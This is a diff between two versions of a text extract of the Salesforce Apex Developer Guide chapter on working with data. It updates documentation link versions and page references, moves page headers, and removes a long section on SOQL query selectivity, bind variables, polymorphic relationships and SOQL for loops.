-emptyRecycleBin [EmptyRecycleBinResult Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database_EmptyRecycleBinResult.htm)
+convertLead [LeadConvertResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_database_leadconvertresult.htm)
 
 
 Apex Developer Guide Working with Data in Apex
+
+**Operation** **Result Class**
+
+emptyRecycleBin [EmptyRecycleBinResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database_EmptyRecycleBinResult.htm)
 
 ###### Returned Database Errors
 
@@ -11682,14 +11750,14 @@ passing it as a parameter to the `Database.insert` and `Database.update` methods
 Transaction Control
 Read about transaction requests, generating and releasing savepoints, rolling back transactions, and more.
 
+
+Apex Developer Guide Working with Data in Apex
+
 sObjects That Can’t Be Used Together in DML Operations
 DML operations on certain sObjects, sometimes referred to as setup objects, can’t be mixed with DML on non-setup sObjects in the
 same transaction. This restriction exists because some sObjects affect the user’s access to records in the org. You must insert or
 update these types of sObjects in a different transaction to prevent operations from happening with incorrect access-level permissions.
 For example, you can’t update an account and a user role in a single transaction.
-
-
-Apex Developer Guide Working with Data in Apex
 
 sObjects That Don’t Support DML Operations
 
@@ -11751,6 +11819,9 @@ which is the behavior in API versions 14.0 and earlier. For example:
 
 ```
 
+
+Apex Developer Guide Working with Data in Apex
+
 **`assignmentRuleHeader`** Property
 
 The `assignmentRuleHeader` property specifies the assignment rule to be used when creating a case or lead.
@@ -11758,9 +11829,6 @@ The `assignmentRuleHeader` property specifies the assignment rule to be used whe
 Note: The Database.DMLOptions object supports assignment rules for cases and leads, but not for accounts.
 
 Using the `assignmentRuleHeader` property, you can set these options:
-
-
-Apex Developer Guide Working with Data in Apex
 
 **•** `assignmentRuleID` : The ID of an assignment rule for the case or lead. The assignment rule can be active or inactive. The ID
 can be retrieved by querying the AssignmentRule sObject. If specified, do not specify `useDefaultRule` . If the value is not in
@@ -11813,7 +11881,7 @@ Using the `duplicateRuleHeader` property, you can set these options.
 **•** `allowSave` : Indicates whether a record that’s identified as a duplicate can be saved.
 
 The following example shows how to save an account record that’s been identified as a duplicate. To learn how to iterate through
-[duplicate errors, see DuplicateError Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_Database_DuplicateError.htm)
+[duplicate errors, see DuplicateError Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_Database_DuplicateError.htm)
 
 ```
    Database.DMLOptions dml = new Database.DMLOptions();
@@ -11832,15 +11900,15 @@ The following example shows how to save an account record that’s been identifi
 
 ```
 
+
+Apex Developer Guide Working with Data in Apex
+
 **`emailHeader`** Property
 
 Important: System-generated emails from an unverified email-sending domain aren’t delivered, even if the From email address
 [is verified. See Requirements to Send Email from Salesforce.](https://help.salesforce.com/s/articleView?id=xcloud.security_email_verification_requirements.htm&language=en_US&type=5)
 
 The Salesforce user interface allows you to specify whether or not to send an email when the following events occur:
-
-
-Apex Developer Guide Working with Data in Apex
 
 **•** Creation of a new case or task
 
@@ -11898,6 +11966,9 @@ In the following example, the `triggerAutoResponseEmail` option is specified:
 
 ```
 
+
+Apex Developer Guide Working with Data in Apex
+
 Email sent through Apex because of a group event includes additional behaviors. A _group event_ is an event for which `IsGroupEvent`
 is true. The EventAttendee object tracks the users, leads, or contacts that are invited to a group event. Note the following behaviors for
 group event email sent through Apex:
@@ -11908,9 +11979,6 @@ group event email sent through Apex:
 
 **•** Email sent when updating or deleting a group event also respects the `triggerUserEmail` and `triggerOtherEmail`
 options, as appropriate
-
-
-Apex Developer Guide Working with Data in Apex
 
 **`localeOptions`** Property
 
@@ -11958,6 +12026,9 @@ savepoint as a static variable then try to use it across trigger contexts, you r
 **•** Static variables aren’t reverted during a rollback. If you try to run the trigger again, the static variables retain the values from the first
 run.
 
+
+Apex Developer Guide Working with Data in Apex
+
 **•** `Database.rollback(Savepoint)` and `Database.setSavepoint()` don’t count against the DML row limit, but
 count toward the DML statement limit. This behavior applies to all API versions.
 
@@ -11965,9 +12036,6 @@ count toward the DML statement limit. This behavior applies to all API versions.
 created before the rollback fails because the sObject variable has an ID. Updating or upserting the sObject using the same variable
 also fails because the sObject isn’t in the database and, thus, can’t be updated. To perform further DML operations, create an sObject
 variable without setting its ID.
-
-
-Apex Developer Guide Working with Data in Apex
 
 The following is an example using the `setSavepoint` and `rollback` Database methods.
 
@@ -12006,7 +12074,7 @@ To allow callouts, roll back all uncommitted DML by using a savepoint. Then use 
 to explicitly release savepoints before making the desired callout. When `Database.releaseSavepoint()` is called,
 `SAVEPOINT_RELEASE` is logged.
 
-See `[releaseSavepoint()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_releaseSavepoint)` for more information.
+See `[releaseSavepoint()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_releaseSavepoint)` for more information.
 
 In this example, the `makeACallout()` callout succeeds because the uncommitted DML is rolled back and the savepoint is released.
 
@@ -12053,6 +12121,9 @@ all active savepoints before making the callout.
 
 ```
 
+
+Apex Developer Guide Working with Data in Apex
+
 In this example, DML is pending when the callout is made. The `CalloutException` informs you that you must roll back the
 transaction before the callout is made or the transaction must be committed.
 
@@ -12067,12 +12138,6 @@ transaction before the callout is made or the transaction must be committed.
 
      makeACallout();
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
    } catch (System.CalloutException ex) {
 
      Assert.isTrue(ex.getMessage().contains('You have uncommitted work pending. Please commit
@@ -12132,15 +12197,15 @@ Note: This list includes sObjects that cannot be used together in the same DML t
 
 You can only insert and update a group in a transaction with other sObjects. Other DML operations aren’t allowed.
 
+
+Apex Developer Guide Working with Data in Apex
+
 **•** GroupMember
 
 Note: With legacy Apex code saved using Salesforce API version 14.0 and earlier, you can insert and update a group member
 with other sObjects in the same transaction.
 
 **•** ObjectPermissions
-
-
-Apex Developer Guide Working with Data in Apex
 
 **•** ObjectTerritory2AssignmentRule
 
@@ -12483,7 +12548,7 @@ Apex Developer Guide Working with Data in Apex
 update, or delete ProcessInstance in the SOAP API.
 
 **•** DML operations aren't supported on Data Cloud data model objects (DMOs). For details on using Apex with Data Cloud objects, see
-[Data Cloud in Apex.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/DataCloudInApex.htm)
+[Data Cloud in Apex.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/DataCloudInApex.htm)
 
 **•** To determine if DML is supported on your specific object, use the `Schema.describeSObjects()` method as shown in this
 sample code.
@@ -12537,7 +12602,7 @@ fails with the error message, “Too many batch retries in the presence of Apex 
 Note:
 
 **–** During the second and third attempts, governor limits are reset to their original state before the first attempt. See Execution
-Governors and Limits on page 348.
+Governors and Limits on page 349.
 
 **–** Apex triggers are fired for the first save attempt, and if errors are encountered for some records and subsequent attempts
 are made to save the subset of successful records, triggers are refired on this subset of records.
@@ -12596,10 +12661,10 @@ You can pass a maximum of 10,000 sObject records to a single `insert`, `update`,
 
 Each `upsert` statement consists of two operations, one for inserting records and one for updating records. Each of these operations
 is subject to the runtime limits for `insert` and `update`, respectively. For example, if you upsert more than 10,000 records and
-all of them are being updated, you receive an error. (See Execution Governors and Limits on page 348)
+all of them are being updated, you receive an error. (See Execution Governors and Limits on page 349)
 
 **Upsert and Foreign Keys**
-[You can use foreign keys to upsert sObject records if they have been set as reference fields. For more information, see Field Types](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/field_types.htm)
+[You can use foreign keys to upsert sObject records if they have been set as reference fields. For more information, see Field Types](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/field_types.htm)
 in the _Object Reference for Salesforce._
 
 **Creating Records for Multiple Object Types**
@@ -12644,8 +12709,8 @@ Salesforce splits the records into five chunks:
 **5.** `contact4`
 
 Each call can process up to 10 chunks. If the sObject array contains more than 10 chunks, you must process the records in more than
-[one call. For additional information about this feature, see Creating Records for Different Object Types in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.api.meta/api/sforce_api_calls_create.htm#MixedSaveTitle) _[SOAP API Developer](https://developer.salesforce.com/docs/atlas.en-us.260.0.api.meta/api/sforce_api_quickstart_intro.htm)_
-_[Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.api.meta/api/sforce_api_quickstart_intro.htm)_ .
+[one call. For additional information about this feature, see Creating Records for Different Object Types in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api.meta/api/sforce_api_calls_create.htm#MixedSaveTitle) _[SOAP API Developer](https://developer.salesforce.com/docs/atlas.en-us.262.0.api.meta/api/sforce_api_quickstart_intro.htm)_
+_[Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.api.meta/api/sforce_api_quickstart_intro.htm)_ .
 
 Note: For Apex, the chunking of the input array for an insert or update DML operation has two possible causes: the existence
 of multiple object types or the default chunk size of 200. If chunking in the input array occurs because of both of these reasons,
@@ -12875,7 +12940,7 @@ You can also operate on the results using standard arithmetic:
 
 SOQL limits apply when executing SOQL queries. See Execution Governors and Limits.
 
-For a full description of SOQL query syntax, see the _[Salesforce SOQL and SOSL Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/)_ .
+For a full description of SOQL query syntax, see the _[Salesforce SOQL and SOSL Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/)_ .
 
 SOSL Statements
 
@@ -12932,7 +12997,7 @@ SOSL limits apply when executing SOSL queries. See Execution Governors and Limit
 Note: The 4,000 characters limit for WHERE clause strings doesn’t apply to SOQL queries in Apex if the WHERE clause includes
 the IN operator.
 
-For a full description of SOSL query syntax, see the _[Salesforce SOQL and SOSL Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/)_ .
+For a full description of SOSL query syntax, see the _[Salesforce SOQL and SOSL Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/)_ .
 
 ##### 1. Working with SOQL and SOSL Query Results
 
@@ -13039,7 +13104,7 @@ contact can be used to modify a field on the account:
 
 Note: To provide the most complete example, this code uses some elements that are described later in this guide:
 
-**•** For information on `insert` and `update` [, see Insert Statement and Update Statement.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_dml_section.htm)
+**•** For information on `insert` and `update` [, see Insert Statement and Update Statement.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_dml_section.htm)
 
 ```
    Account a = new Account(Name = 'Acme');
@@ -13118,7 +13183,7 @@ account, the insert fails.
 
 Tip: The following code is equivalent to the code above. However, because it uses a SOQL query, it is not as efficient. If this code
 was called multiple times, it could reach the execution limit for the maximum number of SOQL queries. For more information on
-execution limits, see Execution Governors and Limits on page 348.
+execution limits, see Execution Governors and Limits on page 349.
 
 ```
       Account refAcct = [SELECT Id FROM Account WHERE externalId__c='12345'];
@@ -13178,7 +13243,7 @@ Apex Developer Guide Working with Data in Apex
 
 Aggregate functions in SOQL, such as `SUM()` and `MAX()`, allow you to roll up and summarize your data in a query.
 
-For more information on aggregate functions, see _Aggregate Functions_ [in the Salesforce SOQL and SOSL Reference Guide.](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/sforce_api_calls_soql_select_agg_functions.htm)
+For more information on aggregate functions, see _Aggregate Functions_ [in the Salesforce SOQL and SOSL Reference Guide.](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/sforce_api_calls_soql_select_agg_functions.htm)
 
 You can use aggregate functions without using a `GROUP BY` clause. For example, you could use the `AVG()` aggregate function to
 find the average `Amount` for all your opportunities.
@@ -13219,7 +13284,7 @@ you could find the average `Amount` for all your opportunities by campaign.
 
 Any aggregated field in a `SELECT` list that does not have an alias automatically gets an implied alias with a format `expr` _**`i`**_, where _`i`_
 denotes the order of the aggregated fields with no explicit aliases. The value of _`i`_ starts at 0 and increments for every aggregated field
-with no explicit alias. For more information, see _Using Aliases with_ _`GROUP BY`_ [in the Salesforce SOQL and SOSL Reference Guide.](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/)
+with no explicit alias. For more information, see _Using Aliases with_ _`GROUP BY`_ [in the Salesforce SOQL and SOSL Reference Guide.](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/)
 
 Note: Queries that include aggregate functions are still subject to the limit on total number of query rows. All aggregate functions
 other than `COUNT()` or `COUNT(fieldname)` include each row used by the aggregation as a query row for the purposes
@@ -13228,7 +13293,7 @@ of limit tracking.
 For `COUNT()` or `COUNT(fieldname)` queries, limits are counted as one query row, unless the query contains a GROUP BY
 clause, in which case one query row per grouping is consumed.
 
-For information about the limits that apply to queries with `for` loop, see SOQL For Loops on page 181.
+For information about the limits that apply to queries with `for` loop, see SOQL For Loops on page 182.
 
 ##### Working with Very Large SOQL Queries
 
@@ -13284,8 +13349,8 @@ Instead, use a SOQL query `for` loop as in one of the following examples:
 ```
 
 Note: Using the SOQL query within the `for` loop reduces the possibility of reaching the limit on heap size. However, this approach
-[can result in more CPU cycles being used with increased DML calls. For more information, see SOQL For Loops Versus Standard](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/langCon_apex_loops_for_SOQL.htm#soql_for_loop_desc)
-[SOQL Queries.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/langCon_apex_loops_for_SOQL.htm#soql_for_loop_desc)
+[can result in more CPU cycles being used with increased DML calls. For more information, see SOQL For Loops Versus Standard](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/langCon_apex_loops_for_SOQL.htm#soql_for_loop_desc)
+[SOQL Queries.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/langCon_apex_loops_for_SOQL.htm#soql_for_loop_desc)
 
 The following example demonstrates a SOQL query `for` loop that’s used to mass update records. Suppose that you want to change
 the last name of a contact in records for contacts whose first and last names match specified criteria:
@@ -13320,7 +13385,7 @@ the last name of a contact in records for contacts whose first and last names ma
 Instead of using a SOQL query in a `for` loop, the preferred method of mass updating records is to use batch Apex, which minimizes
 the risk of hitting governor limits.
 
-For more information, see SOQL For Loops on page 181.
+For more information, see SOQL For Loops on page 182.
 
 More Efficient SOQL Queries
 
@@ -13343,7293 +13408,4 @@ rows.
 **•** The following fields are indexed by default.
 
 **–** Primary keys (Id, Name, and OwnerId fields)
-
-**–** Foreign keys (lookup or master-detail relationship fields)
-
-**–** Audit dates (CreatedDate and SystemModstamp fields)
-
-**–** RecordType fields (indexed for all standard objects that feature them)
-
-**–** Custom fields that are marked as External ID or Unique
-
-**•** Fields not indexed by default are automatically indexed when the Salesforce optimizer recognizes that an index can improve
-performance for frequently run queries.
-
-**•** Salesforce Support can add custom indexes on request for customers.
-
-**•** A custom index can't be created on these types of fields: multi-select picklists, currency fields in a multicurrency organization,
-long text fields, some formula fields, and binary fields (fields of type blob, file, or encrypted text.) New data types, typically complex
-ones, are periodically added to Salesforce, and fields of these types don’t always allow custom indexing.
-
-**•** You can’t create custom indexes on formula fields that include invocations of the `TEXT` function on picklist fields.
-
-**•** Typically, a custom index isn’t used in these cases.
-
-**–** The queried values exceed the system-defined threshold.
-
-**–** The filter operator is a negative operator such as `NOT EQUAL TO` (or `!=` ), `NOT CONTAINS`, and `NOT STARTS`
-`WITH` .
-
-**–** The `CONTAINS` operator is used in the filter, and the number of rows to be scanned exceeds 333,333. The `CONTAINS`
-operator requires a full scan of the index. This threshold is subject to change.
-
-**–** You’re comparing with an empty value ( `Name != ''` ).
-
-However, there are other complex scenarios in which custom indexes can’t be used. Contact your Salesforce representative if
-your scenario isn't covered by these cases or if you need further assistance with non-selective queries.
-
-**Examples of Selective SOQL Queries**
-To better understand whether a query on a large object is selective or not, let's analyze some queries. For these queries, assume that
-there are more than 1 million records for the Account sObject. These records include soft-deleted records, that is, deleted records
-that are still in the Recycle Bin.
-
-Query 1:
-
-```
-     SELECT Id FROM Account WHERE Id IN (<list of account IDs>)
-
-```
-
-The `WHERE` clause is on an indexed field (Id). If `SELECT COUNT() FROM Account WHERE Id IN (<list of`
-`account IDs>)` returns fewer records than the selectivity threshold, the index on `Id` is used. This index is typically used when
-the list of IDs contains only a few records.
-
-Query 2:
-
-```
-     SELECT Id FROM Account WHERE Name != ''
-
-```
-
-Since Account is a large object even though Name is indexed (primary key), this filter returns most of the records, making the query
-non-selective.
-
-Query 3:
-
-```
-     SELECT Id FROM Account WHERE Name != '' AND CustomField__c = 'ValueA'
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-Here we have to see if any filter, when considered individually, is selective. As we saw in the previous example, the first filter isn't
-selective. So let's focus on the second one. If the count of records returned by `SELECT COUNT() FROM Account WHERE`
-`CustomField__c = 'ValueA'` is lower than the selectivity threshold, and CustomField__c is indexed, the query is selective.
-
-##### Using SOQL Queries That Return One Record
-
-SOQL queries can be used to assign a single sObject value when the result list contains only one element.
-
-When the L-value of an expression is a single sObject type, Apex automatically assigns the single sObject record in the query result list
-to the L-value. A runtime exception results if zero sObjects or more than one sObject is found in the list. For example:
-
-```
-   List<Account> accts = [SELECT Id FROM Account];
-
-   // These lines of code are only valid if one row is returned from
-
-   // the query. Notice that the second line dereferences the field from the
-
-   // query without assigning it to an intermediary sObject variable.
-
-   Account acct = [SELECT Id FROM Account];
-
-   String name = [SELECT Name FROM Account].Name;
-
-```
-
-This usage is supported with the following Apex types, methods, or operators:
-
-**•** `Database.query` method.
-
-**•** [Safe Navigation Operator. See Safe Navigation Operator.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/langCon_apex_SafeNavigationOperator.htm)
-
-**•** [Null Coalescing Operator. See Null Coalescing Operator.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/langCon_apex_NullCoalescingOperator.htm)
-
-**•** `Map.values` .
-
-Warning: Although currently supported, Salesforce recommends against using this feature with `Map.values` .
-
-##### Improve Performance by Avoiding Null Values
-
-In your SOQL and SOSL queries, explicitly filtering out null values in the WHERE clause allows Salesforce to improve query performance.
-In the following example, any records where the `Thread__c` value is null are eliminated from the search.
-
-```
-   Public class TagWS {
-
-   /* getThreadTags
-
-   *
-
-   * a quick method to pull tags not in the existing list
-
-   *
-
-   */
-
-     public static webservice List<String>
-
-     getThreadTags(String threadId, List<String> tags) {
-
-       system.debug(LoggingLevel.Debug,tags);
-
-       List<String> retVals = new List<String>();
-
-       Set<String> tagSet = new Set<String>();
-
-       Set<String> origTagSet = new Set<String>();
-
-       origTagSet.addAll(tags);
-
-   // Note WHERE clause optimizes search where Thread__c is not null
-
-       for(CSO_CaseThread_Tag__c t :
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-         [SELECT Name FROM CSO_CaseThread_Tag__c
-
-         WHERE Thread__c = :threadId AND
-
-         Thread__c != null])
-
-       {
-
-         tagSet.add(t.Name);
-
-       }
-
-       for(String x : origTagSet) {
-
-     // return a minus version of it so the UI knows to clear it
-
-         if(!tagSet.contains(x)) retVals.add('-' + x);
-
-       }
-
-       for(String x : tagSet) {
-
-     // return a plus version so the UI knows it's new
-
-         if(!origTagSet.contains(x)) retvals.add('+' + x);
-
-       }
-
-       return retVals;
-
-     }
-
-   }
-
-##### Working with Polymorphic Relationships in SOQL Queries
-
-```
-
-A polymorphic relationship is a relationship between objects where a referenced object can be one of several different types. For example,
-the `Who` relationship field of a Task can be a Contact or a Lead.
-
-The following describes how to use SOQL queries with polymorphic relationships in Apex. If you want more general information on
-[polymorphic relationships, see Understanding Relationship Fields and Polymorphic Fields in the SOQL and SOSL Reference.](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/sforce_api_calls_soql_relationships_and_polymorph_keys.htm)
-
-You can use SOQL queries that reference polymorphic fields in Apex to get results that depend on the object type referenced by the
-polymorphic field. One approach is to filter your results using the `Type` qualifier. This example queries Events that are related to an
-Account or Opportunity via the What field.
-
-```
-   List<Event> events = [SELECT Description FROM Event WHERE What.Type IN ('Account',
-
-   'Opportunity')];
-
-```
-
-Another approach would be to use the `TYPEOF` clause in the SOQL `SELECT` statement. This example also queries Events that are
-related to an Account or Opportunity via the What field.
-
-```
-   List<Event> events = [SELECT TYPEOF What WHEN Account THEN Phone WHEN Opportunity THEN
-
-   Amount END FROM Event];
-
-```
-
-These queries return a list of sObjects where the relationship field references the desired object types.
-
-If you need to access the referenced object in a polymorphic relationship, you can use the instanceof keyword to determine the object
-type. The following example uses `instanceof` to determine whether an Account or Opportunity is related to an Event.
-
-```
-   Event myEvent = eventFromQuery;
-
-   if (myEvent.What instanceof Account) {
-
-      // myEvent.What references an Account, so process accordingly
-
-   } else if (myEvent.What instanceof Opportunity) {
-
-      // myEvent.What references an Opportunity, so process accordingly
-
-   }
-
-```
-
-Note that you must assign the referenced sObject that the query returns to a variable of the appropriate type before you can pass it to
-another method. The following example
-
-**1.** Queries for User or Group owners of Merchandise__c custom objects using a SOQL query with a `TYPEOF` clause
-
-
-Apex Developer Guide Working with Data in Apex
-
-**2.** Uses `instanceof` to determine the owner type
-
-**3.** Assigns the owner objects to User or Group type variables before passing them to utility methods
-
-```
-   public class PolymorphismExampleClass {
-
-      // Utility method for a User
-
-      public static void processUser(User theUser) {
-
-        System.debug('Processed User');
-
-      }
-
-      // Utility method for a Group
-
-      public static void processGroup(Group theGroup) {
-
-        System.debug('Processed Group');
-
-      }
-
-      public static void processOwnersOfMerchandise() {
-
-        // Select records based on the Owner polymorphic relationship field
-
-        List<Merchandise__c> merchandiseList = [SELECT TYPEOF Owner WHEN User THEN LastName
-
-    WHEN Group THEN Email END FROM Merchandise__c];
-
-        // We now have a list of Merchandise__c records owned by either a User or Group
-
-        for (Merchandise__c merch: merchandiseList) {
-
-           // We can use instanceof to check the polymorphic relationship type
-
-           // Note that we have to assign the polymorphic reference to the appropriate
-
-           // sObject type before passing to a method
-
-           if (merch.Owner instanceof User) {
-
-             User userOwner = merch.Owner;
-
-             processUser(userOwner);
-
-           } else if (merch.Owner instanceof Group) {
-
-             Group groupOwner = merch.Owner;
-
-             processGroup(groupOwner);
-
-           }
-
-        }
-
-      }
-
-   }
-
-##### Using Apex Variables in SOQL and SOSL Queries
-
-```
-
-SOQL and SOSL statements in Apex can reference Apex code variables and expressions if they’re preceded by a colon ( `:` ). This use of a
-local code variable within a SOQL or SOSL statement is called a _bind_ . The Apex parser first evaluates the local variable in code context
-before executing the SOQL or SOSL statement. Bind expressions can be used as:
-
-**•** The search string in `FIND` clauses.
-
-**•** The filter literals in `WHERE` clauses.
-
-**•** The value of the `IN` or `NOT IN` operator in `WHERE` clauses, allowing filtering on a dynamic set of values. Note that this is of
-particular use with a list of IDs or Strings, though it works with lists of any type.
-
-**•** The division names in `WITH DIVISION` clauses.
-
-**•** The numeric value in `LIMIT` clauses.
-
-**•** The numeric value in `OFFSET` clauses.
-
-For example:
-
-```
-   Account A = new Account(Name='xxx');
-
-   insert A;
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-   Account B;
-
-   // A simple bind
-
-   B = [SELECT Id FROM Account WHERE Id = :A.Id];
-
-   // A bind with arithmetic
-
-   B = [SELECT Id FROM Account
-
-      WHERE Name = :('x' + 'xx')];
-
-   String s = 'XXX';
-
-   // A bind with expressions
-
-   B = [SELECT Id FROM Account
-
-      WHERE Name = :'XXXX'.substring(0,3)];
-
-   // A bind with INCLUDES clause
-
-   B = [SELECT Id FROM Account WHERE :A.TYPE INCLUDES (‘Customer – Direct; Customer –
-
-   Channel’)];
-
-   // A bind with an expression that is itself a query result
-
-   B = [SELECT Id FROM Account
-
-      WHERE Name = :[SELECT Name FROM Account
-
-               WHERE Id = :A.Id].Name];
-
-   Contact C = new Contact(LastName='xxx', AccountId=A.Id);
-
-   insert new Contact[]{C, new Contact(LastName='yyy',
-
-                         accountId=A.id)};
-
-   // Binds in both the parent and aggregate queries
-
-   B = [SELECT Id, (SELECT Id FROM Contacts
-
-              WHERE Id = :C.Id)
-
-      FROM Account
-
-      WHERE Id = :A.Id];
-
-   // One contact returned
-
-   Contact D = B.Contacts;
-
-   // A limit bind
-
-   Integer i = 1;
-
-   B = [SELECT Id FROM Account LIMIT :i];
-
-   // An OFFSET bind
-
-   Integer offsetVal = 10;
-
-   List<Account> offsetList = [SELECT Id FROM Account OFFSET :offsetVal];
-
-   // An IN-bind with an Id list. Note that a list of sObjects
-
-   // can also be used--the Ids of the objects are used for
-
-   // the bind
-
-   Contact[] cc = [SELECT Id FROM Contact LIMIT 2];
-
-   Task[] tt = [SELECT Id FROM Task WHERE WhoId IN :cc];
-
-   // An IN-bind with a String list
-
-   String[] ss = new String[]{'a', 'b'};
-
-   Account[] aa = [SELECT Id FROM Account
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-             WHERE AccountNumber IN :ss];
-
-   // A SOSL query with binds in all possible clauses
-
-   String myString1 = 'aaa';
-
-   String myString2 = 'bbb';
-
-   Integer myInt3 = 11;
-
-   String myString4 = 'ccc';
-
-   Integer myInt5 = 22;
-
-   List<List<SObject>> searchList = [FIND :myString1 IN ALL FIELDS
-
-                        RETURNING
-
-                          Account (Id, Name WHERE Name LIKE :myString2
-
-                               LIMIT :myInt3),
-
-                          Contact,
-
-                          Opportunity,
-
-                          Lead
-
-                        WITH DIVISION =:myString4
-
-                        LIMIT :myInt5];
-
-```
-
-Note: Apex bind variables aren’t supported for the units parameter in the `DISTANCE` function. This query doesn’t work.
-
-```
-      String units = 'mi';
-
-      List<Account> accountList =
-
-        [SELECT ID, Name, BillingLatitude, BillingLongitude
-
-         FROM Account
-
-         WHERE DISTANCE(My_Location_Field__c, GEOLOCATION(10,10), :units) < 10];
-
-##### Querying All Records with a SOQL Statement
-
-```
-
-SOQL statements can use the `ALL ROWS` keywords to query all records in an organization, including deleted records and archived
-activities. For example:
-
-```
-   System.assertEquals(2, [SELECT COUNT() FROM Contact WHERE AccountId = a.Id ALL ROWS]);
-
-```
-
-You can use `ALL ROWS` to query records in your organization's Recycle Bin. You cannot use the `ALL ROWS` keywords with the `FOR`
-`UPDATE` keywords.
-
-#### SOQL For Loops SOQL for loops iterate over all of the sObject records returned by a SOQL query.
-
-The syntax of a SOQL `for` loop is either:
-
-```
-   for ( variable : [ soql_query ]) {
-
-     code_block
-
-   }
-
-```
-
-or
-
-```
-   for ( variable_list : [ soql_query ]) {
-
-     code_block
-
-   }
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-Both _**`variable`**_ and _**`variable_list`**_ must be of the same type as the sObjects that are returned by the _**`soql_query`**_ .
-As in standard SOQL queries, the `[` _**`soql_query`**_ `]` statement can refer to code expressions in their `WHERE` clauses using the `:`
-syntax. For example:
-
-```
-   String s = 'Acme';
-
-   for (Account a : [SELECT Id, Name from Account
-
-              where Name LIKE :(s+'%')]) {
-
-      // Your code
-
-   }
-
-```
-
-The following example combines creating a list from a SOQL query, with the DML `update` method.
-
-```
-   // Create a list of account records from a SOQL query
-
-   List<Account> accs = [SELECT Id, Name FROM Account WHERE Name = 'Siebel'];
-
-   // Loop through the list and update the Name field
-
-   for(Account a : accs){
-
-     a.Name = 'Oracle';
-
-   }
-
-   // Update the database
-
-   update accs;
-
-```
-
-SOQL For Loops Versus Standard SOQL Queries
-
-SOQL `for` loops differ from standard SOQL statements because of the method they use to retrieve sObjects. While the standard queries
-discussed in SOQL and SOSL Queries can retrieve either the `count` of a query or a number of object records, SOQL `for` loops retrieve
-all sObjects, using efficient chunking with calls to the `query` and `queryMore` methods of SOAP API. Developers can avoid the limit
-on heap size by using a SOQL `for` loop to process query results that return multiple records. However, this approach can result in more
-CPU cycles being used. See Total heap size.
-
-Queries including an aggregate function don't support `queryMore` . A run-time exception occurs if you use a query containing an
-aggregate function that returns more than 2,000 rows in a `for` loop.
-
-[For fine-grained control over the results of a SOQL query, consider using Apex cursors. See Apex Cursors.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_cursors.htm)
-
-SOQL For Loop Formats
-
-SOQL `for` loops can process records one at a time using a single sObject variable, or in batches of 200 sObjects at a time using an
-sObject list:
-
-**•** The single sObject format executes the `for` loop's `<code_block>` one time per sObject record. Consequently, it’s easy to
-understand and use, but is grossly inefficient if you want to use data manipulation language (DML) statements within the `for` loop
-body. Each DML statement ends up processing only one sObject at a time.
-
-**•** The sObject list format executes the `for` loop's `<code_block>` one time per list of 200 sObjects. Consequently, it’s a little more
-difficult to understand and use, but is the optimal choice if you must use DML statements within the `for` loop body. Each DML
-statement can bulk process a list of sObjects at a time.
-
-For example, the following code illustrates the difference between the two types of SOQL query `for` loops:
-
-```
-   // Create a savepoint because the data should not be committed to the database
-
-   Savepoint sp = Database.setSavepoint();
-
-   insert new Account[]{new Account(Name = 'yyy'),
-
-                new Account(Name = 'yyy'),
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-                new Account(Name = 'yyy')};
-
-   // The single sObject format executes the for loop once per returned record
-
-   Integer i = 0;
-
-   for (Account tmp : [SELECT Id FROM Account WHERE Name = 'yyy']) {
-
-      i++;
-
-   }
-
-   System.assert(i == 3); // Since there were three accounts named 'yyy' in the
-
-                 // database, the loop executed three times
-
-   // The sObject list format executes the for loop once per returned batch
-
-   // of records
-
-   i = 0;
-
-   Integer j;
-
